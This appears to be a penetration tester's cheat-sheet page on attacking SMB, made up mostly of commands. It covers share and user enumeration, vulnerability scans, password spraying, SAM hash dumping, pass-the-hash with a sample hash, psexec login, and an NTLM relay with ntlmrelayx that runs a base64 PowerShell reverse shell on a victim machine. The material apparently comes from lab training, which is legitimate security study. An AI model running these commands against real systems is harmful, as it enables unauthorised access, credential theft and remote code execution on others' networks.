# SMB

## Enumeration

### Nmap

Depending on the SMB implementation and the operating system, we will get different information using `Nmap`. Keep in mind that when targeting Windows OS, version information is usually not included as part of the Nmap scan results. Instead, Nmap will try to guess the OS version. However, we will often need other scans to identify if the target is vulnerable to a particular exploit

```bash
sudo nmap -sV -sC -p139,445 10.129.14.128


sudo nmap -p 139,445 -v -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.129.14.128

sudo nmap -p 139,445 --script smb-vuln* 10.129.14.128 -oA smb-vuln
```

### SMBclient

```bash
smbclient -N -L //10.129.14.128
smbclient //10.129.14.128/notes
get prep-prod.txt 

# execute local system commands
!ls
!cat prep-prod.txt 

smbclient -L //<IP> --user=domain/user%password
smbclient -L //<IP> -U user
smbclient //$IP/profiles$ -c ls | awk '{print $1}' > users.lst

# Download files
prompt
smb: /> recurse
smb: /> mget *


sudo nmap 10.129.14.128 -sV -sC -p139,445
```

### SMBmap

```shell
smbmap -H 10.129.14.128
smbmap -u DoesNotExist -H <ip-addr>
smbmap -d <domain> -u <username> -p <password> -H <ip-addr>

# Using `smbmap` with the `-r` or `-R` (recursive) option, one can browse the directories:
smbmap -H 10.129.14.128 -r notes

# download a file
smbmap -H 10.129.14.128 --download "notes\note.txt"
smbmap -R <sharename> -H <ip-addr> -A <filename> -q

# upload a file
smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"
```

### CrackMapExec

```shell
crackmapexec smb 10.129.14.128 --shares -u '' -p ''
crackmapexec smb $IP --users
crackmapexec smb $IP -u User -p 'P@$$w0rd!' --shares
crackmapexec smb 192.168.112.312 -u userlist.txt -p 'someP@$$w0rd!'
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
#  Enumerating Logged-on Users
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
# Extract Hashes from SAM Database
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
# Pass-the-Hash (PtH)
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

> **Note:** By default CME will exit after a successful login is found. Using the `--continue-on-success` flag will continue spraying even after a valid password is found. it is very useful for spraying a single password against a large user list.

### RPCclient

```bash
rpcclient -U "" 10.129.14.128
rpcclient -U'%' 10.10.110.17
rpcclient -U "" -N 10.10.10.161

# grep users for password spraying and ASEProasting
rpcclient -U "" <ip> -N -c "enumdomusers" | grep -oP '\[.*?\]' | grep "0x" -v | tr -d '[]' > userlist.txt


# manual brute force RIDs
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done

# Impacket-Samrdump.py to brute force RIDs
samrdump.py 10.129.14.128
```

| **Query**                 | **Description**                                                    |
| ------------------------- | ------------------------------------------------------------------ |
| `srvinfo`                 | Server information.                                                |
| `enumdomains`             | Enumerate all domains that are deployed in the network.            |
| `querydominfo`            | Provides domain, server, and user information of deployed domains. |
| `netshareenumall`         | Enumerates all available shares.                                   |
| `netsharegetinfo <share>` | Provides information about a specific share.                       |
| `enumdomusers`            | Enumerates all domain users.                                       |
| `queryuser <RID>`         | Provides information about a specific user.                        |

**Cheatsheet** https://www.willhackforsushi.com/sec504/SMB-Access-from-Linux.pdf

### Enum4Linux-ng

```bash
git clone https://github.com/cddmp/enum4linux-ng.git
cd enum4linux-ng
pip3 install -r requirements.txt

./enum4linux-ng.py 10.129.14.128 -A
./enum4linux-ng.py 10.10.11.45 -A -C
```

### Interact with SMB

**Windows**

```powershell
# displays a list of a directory's files and subdirectories.
dir \\192.168.220.129\Finance\
Get-ChildItem \\192.168.220.129\Finance\

# The command 'net use' connects a computer to or disconnects a computer from a shared resource or displays information about computer connections. We can connect to a file share with the following command and map its content to the drive letter `n`.
net use n: \\192.168.220.129\Finance
net use n: \\192.168.220.129\Finance /user:plaintext Password123

PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"

Name           Used (GB)     Free (GB) Provider      Root                           CurrentLocation
----           ---------     --------- --------      ----                                               ---------------
N                                      FileSystem    \\192.168.220.129\Finance


PS C:\htb> $username = 'plaintext'
PS C:\htb> $password = 'Password123'
PS C:\htb> $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
PS C:\htb> $cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
PS C:\htb> New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred

Name           Used (GB)     Free (GB) Provider      Root                                                              CurrentLocation
----           ---------     --------- --------      ----                                                              ---------------
N                                      FileSystem    \\192.168.220.129\Finance


# find how many files a shared folder and its subdirectories contain
dir n: /a-d /s /b | find /c ":\"

PS C:\htb> N:
PS N:\> (Get-ChildItem -File -Recurse | Measure-Object).Count # or (gci -File -Recurse | Measure-Object).Count

# search for specific names
C:\htb>dir n:\*cred* /s /b
n:\Contracts\private\credentials.txt

C:\htb>dir n:\*secret* /s /b
n:\Contracts\private\secret.txt

Get-ChildItem -Recurse -Path N:\ -Include *cred* -File

# search for a specific word within a text file
c:\htb>findstr /s /i cred n:\*.*

n:\Contracts\private\secret.txt:file with all credentials
n:\Contracts\private\credentials.txt:admin:SecureCredentials!

Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

**Linux**

> We need to install `cifs-utils` to connect to an SMB share folder. To install it we can execute from the command line `sudo apt install cifs-utils`.

```shell
sudo mkdir /mnt/Finance
sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance

# As an alternative, we can use a credential file
mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

The file `credentialfile` has to be structured like this:

```txt
username=plaintext
password=Password123
domain=.
```

```shell
# find file names
find /mnt/Finance/ -name *cred*

# find files that contain the string `cred`:
grep -rn /mnt/Finance/ -ie cred
```

* [Impacket PsExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py) - Python PsExec like functionality example using [RemComSvc](https://github.com/kavika13/RemCom).
* [Impacket SMBExec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) - A similar approach to PsExec without using [RemComSvc](https://github.com/kavika13/RemCom). The technique is described here. This implementation goes one step further, instantiating a local SMB server to receive the output of the commands. This is useful when the target machine does NOT have a writeable share available.
* [Impacket atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py) - This example executes a command on the target machine through the Task Scheduler service and returns the output of the executed command.
* [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) - includes an implementation of `smbexec` and `atexec`.
* [Metasploit PsExec](https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/windows/smb/psexec.md) - Ruby PsExec implementation.
*

**Examples**

```powershell
impacket-psexec administrator:'Password123!'@10.10.110.17
```

> **Note:** If the`--exec-method` is not defined, CrackMapExec will try to execute the atexec method, if it fails you can try to specify the `--exec-method` smbexec.

## Relaying

If we cannot crack the hash, we can potentially relay the captured hash to another machine using [impacket-ntlmrelayx](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py) or Responder [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py). Let us see an example using `impacket-ntlmrelayx`.

First, we need to set SMB to `OFF` in our responder configuration file (`/etc/responder/Responder.conf`).

```shell
lojique@htb[/htb]$ cat /etc/responder/Responder.conf | grep 'SMB ='

SMB = Off
```

Then we execute `impacket-ntlmrelayx` with the option `--no-http-server`, `-smb2support`, and the target machine with the option `-t`. By default, `impacket-ntlmrelayx` will dump the SAM database, but we can execute commands by adding the option `-c`.&#x20;

<figure><img src="../../.gitbook/assets/Pasted image 20230601165018.png" alt=""><figcaption></figcaption></figure>

We can create a PowerShell reverse shell using [https://www.revshells.com/](https://www.revshells.com/), set our machine IP address, port, and the option Powershell #3 (Base64).

```shell
lojique@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAd...'
```

Once the victim authenticates to our server, we poison the response and make it execute our command to obtain a reverse shell.

<figure><img src="../../.gitbook/assets/Pasted image 20230601165148.png" alt=""><figcaption></figcaption></figure>
